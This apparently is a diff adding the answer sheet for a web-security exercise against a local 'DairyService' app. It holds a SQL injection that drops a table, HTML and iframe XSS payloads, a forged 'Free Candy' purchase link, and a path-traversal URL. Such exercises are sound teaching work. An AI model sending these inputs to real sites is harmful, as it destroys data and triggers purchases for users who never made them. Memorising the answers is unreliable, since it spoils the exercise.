@@ -1,0 +1,63 @@
+N01
+GET http://localhost:8188/DairyService.svc/search?term=a'; DROP TABLE Items; --
+
+
+N02
+POST http://localhost:8188/DairyService.svc/comment?name=david HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 34
+
+<button> htmlInjection </button>
+
+
+N03
+POST http://localhost:8188/DairyService.svc/comment?name=david HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 115
+
+<img src="https://d1poczgreawftx.cloudfront.net/8/w23113_kiddhannah_kiddh23113holycow%282019%2901.jpg?i=90712">
+
+
+N04
+POST http://localhost:8188/DairyService.svc/comment?name=david HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 40
+
+<iframe onload="alert(1);"></iframe>
+
+
+N05
+If someone is logged in to the website, a malicous link could use the registered credientials or cookies to buy items on the website.
+
+
+N06
+POST http://localhost:8188/DairyService.svc/comment?name=david HTTP/1.1
+Host: localhost:8188
+Content-Type: application/json
+Content-Length: 79
+
+<a href="http://localhost:8189/Service.svc/buy?id=248309346">Free Candy</a>
+
+
+C01
+SQLite
+
+
+C02
+3 tables
+
+
+C03
+tama
+
+
+C04
+latter
+
+
+C05
+http://localhost:8188/DairyService.svc/itemimg?id=../ImagesBig/ticheti.jpg
+
